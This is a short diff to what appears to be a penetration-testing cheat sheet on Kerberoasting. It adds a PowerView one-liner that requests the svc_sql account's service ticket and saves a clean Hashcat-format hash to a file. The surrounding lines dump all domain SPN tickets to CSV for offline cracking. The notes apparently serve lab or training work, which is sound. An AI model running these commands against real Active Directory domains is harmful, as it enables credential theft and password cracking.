@@ -2420,6 +2420,11 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 # Request a TGS ticket for a specific user and output it directly in Hashcat format via PowerView
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
+#better command toget ticket and avoid fmt issue
+
+(Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat).Hash -replace '\s+','' | Out-File -FilePath .\svc_sql.txt -Encoding ascii
+
+
 # Export all domain SPN tickets directly into a CSV file for offline processing via PowerView
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 
